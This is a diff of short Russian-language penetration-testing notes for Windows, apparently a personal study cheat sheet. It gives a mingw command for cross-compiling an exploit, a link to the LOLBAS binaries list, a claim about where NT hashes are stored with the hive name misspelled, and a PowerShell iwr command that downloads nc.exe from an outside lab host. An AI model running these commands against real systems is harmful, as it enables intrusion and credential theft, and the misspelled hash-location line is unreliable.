@@ -2,6 +2,9 @@
         Windows
                 Важненько, вот компиляция сплоитов под винду на лине, тулза mingw‐w64 (i686‐w64‐mingw32‐gcc 40564.c –o exploit.exe –lws2_32)
   
+  Всё полезные ексешки в винде:
+  https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
+  
   NT хеши по дефолту храняться в Windows/System32/config/SPA
   
   Powershell команда для скачивания файлов:  PowerShell iwr http://10.10.13.245:8000/nc.exe -OutFile C:\\Users\\Public\\ncc.exe
